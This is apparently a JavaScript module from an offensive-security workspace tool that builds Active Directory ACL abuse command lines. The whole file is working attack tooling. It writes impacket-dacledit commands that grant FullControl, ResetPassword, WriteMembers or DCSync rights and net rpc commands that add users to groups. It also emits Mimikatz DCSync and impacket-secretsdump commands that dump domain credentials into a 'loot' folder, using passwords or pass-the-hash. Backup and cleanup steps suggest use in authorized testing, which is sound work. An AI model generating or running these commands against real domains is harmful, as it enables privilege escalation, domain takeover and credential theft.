const canonicalRight = (value) => {
  const rights = new Map([
    ["all", "All"],
    ["resetpassword", "ResetPassword"],
    ["writemembers", "WriteMembers"],
    ["dcsync", "DCSync"],
  ]);
  return rights.get(String(value || "").trim().toLowerCase()) || "";
};

const impacketRights = new Map([
  ["All", "FullControl"],
  ["ResetPassword", "ResetPassword"],
  ["WriteMembers", "WriteMembers"],
  ["DCSync", "DCSync"],
]);

const shellQuote = (value) => `'${String(value).replaceAll("'", `'"'"'`)}'`;
const variableValue = (variables, key) => String(variables[key] || `{{${key}}}`).trim();

const impacketAuth = (variables) => {
  const account = `${variableValue(variables, "domain")}/${variableValue(variables, "user")}`;
  if (String(variables.password || "").trim()) return shellQuote(`${account}:${variables.password}`);
  return `-hashes ${shellQuote(`:${variableValue(variables, "hash")}`)} ${shellQuote(account)}`;
};

const sambaAuth = (variables) => {
  const account = `${variableValue(variables, "domain")}/${variableValue(variables, "user")}`;
  if (String(variables.password || "").trim()) return `-U ${shellQuote(`${account}%${variables.password}`)}`;
  return `-U ${shellQuote(`${account}%${variableValue(variables, "hash")}`)} --pw-nt-hash`;
};

const targetArgument = (right, variables) => {
  const target = right === "DCSync" ? variableValue(variables, "baseDn") : variableValue(variables, "aclTarget");
  const option = right === "DCSync" || /(^|,)\s*(?:CN|OU|DC)=/i.test(target) ? "-target-dn" : "-target";
  return `${option} ${shellQuote(target)}`;
};

export function buildAclCommands(variables = {}) {
  const right = canonicalRight(variables.aclRights);
  if (!right) {
    return [{
      key: "acl-invalid-right",
      label: "Choose a supported Impacket ACL right",
      value: "printf '%s\\n' 'ACL rights must be one of: All, ResetPassword, WriteMembers, DCSync' >&2; false",
    }];
  }

  const target = String(variables.aclTarget || "selected target").trim();
  const principal = String(variables.aclPrincipal || "selected principal").trim();
  const validDcsyncTargets = [variables.domain, variables.baseDn]
    .map((value) => String(value || "").trim().toLowerCase())
    .filter(Boolean);
  if (right === "DCSync" && variables.aclTarget && validDcsyncTargets.length
    && !validDcsyncTargets.includes(target.toLowerCase())) {
    return [{
      key: "acl-invalid-dcsync-target",
      label: "Set the DCSync ACL target to the domain object",
      value: `printf '%s\\n' ${shellQuote(`DCSync must be granted on the domain object. Set ACL TARGET to ${variables.domain || variables.baseDn}, not ${target}.`)} >&2; false`,
    }];
  }

  const auth = impacketAuth(variables);
  const targetArg = targetArgument(right, variables);
  const principalArg = `-principal ${shellQuote(variableValue(variables, "aclPrincipal"))}`;
  const dcArg = `-dc-ip ${shellQuote(variableValue(variables, "rhost"))}`;
  const rightArg = impacketRights.get(right);
  const slug = right.toLowerCase();
  const daclDir = "{{workspaceRoot}}/{{targetName}}/loot/dacl";
  const beforePath = `${daclDir}/${slug}-before.txt`;
  const afterPath = `${daclDir}/${slug}-after.txt`;
  const latestBackup = `${daclDir}/${slug}-latest-backup.txt`;
  const identity = `${right}: ${principal} -> ${target}`;
  const commands = [];

  const group = String(variables.targetGroup || "").trim();
  const member = String(variables.memberUser || variables.aclPrincipal || variables.user || "").trim();
  if (group) {
    const groupArg = shellQuote(group);
    const memberArg = shellQuote(member || "{{memberUser}}");
    const rpcBase = `-S ${shellQuote(variableValue(variables, "rhost"))} ${sambaAuth(variables)}`;
    commands.push(
      {
        key: "acl-group-members-before",
        label: `Confirm direct members of ${group}`,
        value: `net rpc group members ${groupArg} ${rpcBase}`,
      },
      {
        key: "acl-group-add-member",
        label: `Add ${member || "selected member"} to ${group}`,
        value: `net rpc group addmem ${groupArg} ${memberArg} ${rpcBase}`,
      },
      {
        key: "acl-group-members-after",
        label: `Verify ${member || "selected member"} in ${group}`,
        value: `net rpc group members ${groupArg} ${rpcBase}`,
      },
    );
  }

  commands.push(
    {
      key: "acl-read-before",
      label: `Read target DACL before ${right}`,
      value: `mkdir -p ${shellQuote(daclDir)}; impacket-dacledit -action read ${principalArg} ${targetArg} ${dcArg} ${auth} | tee ${shellQuote(beforePath)}`,
    },
    {
      key: "acl-grant",
      label: `Grant ${right} — ${principal} on ${target}`,
      value: `dacl_dir=${shellQuote(daclDir)}; mkdir -p "$dacl_dir"; stamp=$(date +%Y%m%d-%H%M%S); backup="$dacl_dir/${slug}-before-$stamp.bak"; grant_log="$dacl_dir/${slug}-grant-$stamp.log"; impacket-dacledit -action write -rights ${shellQuote(rightArg)} ${principalArg} ${targetArg} ${dcArg} -file "$backup" ${auth} 2>&1 | tee "$grant_log"; status=\${PIPESTATUS[0]}; test "$status" -eq 0 && grep -Fq 'DACL modified successfully!' "$grant_log" || { echo 'DACL modification was not confirmed'; exit 1; }; printf '%s\\n' "$backup" >${shellQuote(latestBackup)}`,
    },
    {
      key: "acl-verify-grant",
      label: `Read target DACL after ${right}`,
      value: `mkdir -p ${shellQuote(daclDir)}; impacket-dacledit -action read ${principalArg} ${targetArg} ${dcArg} ${auth} | tee ${shellQuote(afterPath)}`,
    },
  );

  if (right === "DCSync") {
    commands.push({
      key: "acl-dcsync-mimikatz",
      label: `Mimikatz console: DCSync as ${principal}`,
      value: "lsadump::dcsync /domain:{{domain}} /user:{{dcsyncUser}}",
    });

    const samePrincipal = !variables.aclPrincipal || !variables.user
      || String(variables.aclPrincipal).trim().toLowerCase() === String(variables.user).trim().toLowerCase();
    if (samePrincipal) {
      commands.push(
        {
          key: "acl-dcsync-impacket-password",
          label: `Impacket DCSync with ${principal}'s password`,
          value: "mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/dcsync'; impacket-secretsdump -just-dc-user '{{dcsyncUser}}' -dc-ip '{{rhost}}' '{{domain}}/{{user}}:{{password}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetName}}/loot/dcsync/{{dcsyncUser}}.txt'",
        },
        {
          key: "acl-dcsync-impacket-hash",
          label: `Impacket DCSync with ${principal}'s NT hash`,
          value: "mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/dcsync'; impacket-secretsdump -hashes ':{{hash}}' -just-dc-user '{{dcsyncUser}}' -dc-ip '{{rhost}}' '{{domain}}/{{user}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetName}}/loot/dcsync/{{dcsyncUser}}.txt'",
        },
      );
    }
  }

  commands.push({
    key: "acl-cleanup",
    label: `Restore DACL backup — ${identity}`,
    value: `backup_pointer=${shellQuote(latestBackup)}; test -s "$backup_pointer" || { echo 'No recorded DACL backup was found'; exit 1; }; backup=$(head -n1 "$backup_pointer"); test -f "$backup" || { echo "DACL backup not found: $backup"; exit 1; }; impacket-dacledit -action restore -file "$backup" ${dcArg} ${auth}`,
  });

  if (group) {
    const rpcBase = `-S ${shellQuote(variableValue(variables, "rhost"))} ${sambaAuth(variables)}`;
    commands.push({
      key: "acl-group-remove-member",
      label: `Cleanup: remove ${member || "selected member"} from ${group}`,
      value: `net rpc group delmem ${shellQuote(group)} ${shellQuote(member || "{{memberUser}}")} ${rpcBase}`,
    });
  }

  return commands;
}
